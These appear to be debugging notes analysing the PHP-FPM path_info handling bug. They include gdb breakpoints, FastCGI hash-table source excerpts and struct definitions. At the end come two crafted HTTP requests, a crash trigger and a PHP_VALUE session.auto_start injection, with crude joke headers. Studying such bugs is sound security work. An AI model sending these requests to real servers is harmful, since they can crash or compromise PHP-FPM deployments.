####  breakpoint 

b /usr/src/php/sapi/fpm/fpm/fpm_main.c:1894 

```c++
zend_first_try {
    while (EXPECTED(fcgi_accept_request(request) >= 0)) { // 接收一个TCP连接 
        char *primary_script = NULL;
        request_body_fd = -1;
        SG(server_context) = (void *) request;
        init_request_info();

```

b /usr/src/php/sapi/fpm/fpm/fpm_main.c:1024

```c
static void init_request_info(void)

```



b /usr/src/php/sapi/fpm/fpm/fpm_main.c:1183

```c
            if (pt) {
                while ((ptr = strrchr(pt, '/')) || (ptr = strrchr(pt, '\\'))) {
                    *ptr = 0;

```
b /usr/src/php/sapi/fpm/fpm/fpm_main.c:1220

```c++
									FCGI_PUTENV(request, "ORIG_PATH_INFO", orig_path_info);
									old = path_info[0]; 
									path_info[0] = 0;
									if (!orig_script_name ||
										strcmp(orig_script_name, env_path_info) != 0) {
										if (orig_script_name) {
											FCGI_PUTENV(request, "ORIG_SCRIPT_NAME", orig_script_name);
										}
										SG(request_info).request_uri = FCGI_PUTENV(request, "SCRIPT_NAME", env_path_info);
									} else {
										SG(request_info).request_uri = orig_script_name;
									}
									path_info[0] = old; // 再把原来的字符复制回来 
```

```c++

#define FCGI_PUTENV(request, name, value) \
	fcgi_quick_putenv(request, name, sizeof(name)-1, FCGI_HASH_FUNC(name, sizeof(name)-1), value)

```

```c++

#define FCGI_HASH_FUNC(var, var_len) \
	(UNEXPECTED(var_len < 3) ? (unsigned int)var_len : \
		(((unsigned int)var[3]) << 2) + \
		(((unsigned int)var[var_len-2]) << 4) + \
		(((unsigned int)var[var_len-1]) << 2) + \
		var_len)
        
char* fcgi_quick_putenv(fcgi_request *req, char* var, int var_len, unsigned int hash_value, char* val)
{
	if (val == NULL) {
		fcgi_hash_del(&req->env, hash_value, var, var_len);
		return NULL;
	} else {
		return fcgi_hash_set(&req->env, hash_value, var, var_len, val, (unsigned int)strlen(val));
	}
}

static char* fcgi_hash_set(fcgi_hash *h, unsigned int hash_value, char *var, unsigned int var_len, char *val, unsigned int val_len)
{
	unsigned int      idx = hash_value & FCGI_HASH_TABLE_MASK; // 127
	fcgi_hash_bucket *p = h->hash_table[idx];

	while (UNEXPECTED(p != NULL)) {
		if (UNEXPECTED(p->hash_value == hash_value) &&
		    p->var_len == var_len &&
		    memcmp(p->var, var, var_len) == 0) {

			p->val_len = val_len;
			p->val = fcgi_hash_strndup(h, val, val_len);
			return p->val;
		}
		p = p->next;
	}

	if (UNEXPECTED(h->buckets->idx >= FCGI_HASH_TABLE_SIZE)) {
		fcgi_hash_buckets *b = (fcgi_hash_buckets*)malloc(sizeof(fcgi_hash_buckets));
		b->idx = 0;
		b->next = h->buckets;
		h->buckets = b;
	}
	p = h->buckets->data + h->buckets->idx; // 找一个存储全局变量的空闲位置 
	h->buckets->idx++;
	p->next = h->hash_table[idx];
	h->hash_table[idx] = p;
	p->list_next = h->list;
	h->list = p;
	p->hash_value = hash_value;
	p->var_len = var_len;
	p->var = fcgi_hash_strndup(h, var, var_len); // 保存 key 
	p->val_len = val_len;
	p->val = fcgi_hash_strndup(h, val, val_len); // 保存 val 
	return p->val;
}


static inline char* fcgi_hash_strndup(fcgi_hash *h, char *str, unsigned int str_len)
{
	char *ret;

	if (UNEXPECTED(h->data->pos + str_len + 1 >= h->data->end)) { //FCGI_HASH_SEG_SIZE =  4096 
		unsigned int seg_size = (str_len + 1 > FCGI_HASH_SEG_SIZE) ? str_len + 1 : FCGI_HASH_SEG_SIZE;
		fcgi_data_seg *p = (fcgi_data_seg*)malloc(sizeof(fcgi_data_seg) - 1 + seg_size);

		p->pos = p->data;
		p->end = p->pos + seg_size;
		p->next = h->data;
		h->data = p;
	}
	ret = h->data->pos; // 获取起始位置
	memcpy(ret, str, str_len);
	ret[str_len] = 0;
	h->data->pos += str_len + 1; 
	return ret;
}


```

### 结构体的定义 

```c
struct _fcgi_request {
	int            listen_socket;
	int            tcp;
	int            fd;
	int            id;
	int            keep;
#ifdef TCP_NODELAY
	int            nodelay;
#endif
	int            ended;
	int            in_len;
	int            in_pad;

	fcgi_header   *out_hdr;

	unsigned char *out_pos;
	unsigned char  out_buf[1024*8];
	unsigned char  reserved[sizeof(fcgi_end_request_rec)];

	fcgi_req_hook  hook;

	int            has_env;
	fcgi_hash      env;
};

typedef struct _fcgi_hash {
	fcgi_hash_bucket  *hash_table[FCGI_HASH_TABLE_SIZE];
	fcgi_hash_bucket  *list;
	fcgi_hash_buckets *buckets;
	fcgi_data_seg     *data;
} fcgi_hash;

typedef struct _fcgi_data_seg {
	char                  *pos;
	char                  *end;
	struct _fcgi_data_seg *next;
	char                   data[1];
} fcgi_data_seg;


typedef struct _fcgi_hash_bucket {
	unsigned int              hash_value;
	unsigned int              var_len;
	char                     *var;
	unsigned int              val_len;
	char                     *val;
	struct _fcgi_hash_bucket *next;
	struct _fcgi_hash_bucket *list_next;
} fcgi_hash_bucket;


typedef struct _fcgi_hash_buckets {
	unsigned int	           idx;
	struct _fcgi_hash_buckets *next;
	struct _fcgi_hash_bucket   data[FCGI_HASH_TABLE_SIZE];
} fcgi_hash_buckets;

```

```
tel request.env.data # 打印 data 的数据

p env_path_info

p request.env.buckets.data

```



#### First Crash: 

```
GET /index.php/PHP%0Ais_the_shittiest_lang.php?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0
D-Pisos: 8=D
Ebut: mamku tvoyu
```

#### fisrt Session 

```
GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0
D-Pisos: 8===========================================D
Ebut: mamku tvoyu
```



